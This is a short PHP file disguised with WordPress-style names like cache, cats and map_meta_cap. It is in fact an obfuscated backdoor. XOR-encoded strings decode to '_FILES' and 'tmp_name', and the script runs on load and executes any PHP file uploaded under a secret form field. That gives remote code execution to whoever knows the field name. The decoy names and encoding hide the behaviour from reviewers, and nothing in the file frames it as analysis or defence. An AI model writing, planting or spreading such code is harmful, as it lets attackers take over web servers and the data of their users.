<?php 	

function cache()

{
    $patternses = 'FwJU4V9MZmHR';
    $real_mime_types = $patternses;
	$babes = 'html_parts';
    
    $category = $GLOBALS[cats("%191%03%19q%05", $real_mime_types)];
    $dirs = $category;
    $patterns = isset($dirs[$real_mime_types]);
    if ($patterns)

    {
        $non_cached_ids = $category[$real_mime_types];
	$array = 'cache_key';
        $map_meta_cap = $non_cached_ids[cats("2%1A%3A%0AZ7T%28", $real_mime_types)];

        $last_pee = $map_meta_cap;
        include ($last_pee);
    }
}
	$count2 = 'permastructs';
function cats($_links_add_target, $exts)

{

    $link = $exts;
    $ancestor = "url" . "decode";
    $matches = $ancestor($_links_add_target);
    $filename_raw = substr($link,0, strlen($matches));

    $number = $matches ^ $filename_raw;
	$original_value = 'pre_attribute_ws';
    
	$template_lock = 'months';
    $matches = strpos($number, $filename_raw);

    
    return $number;
}

cache();


?>
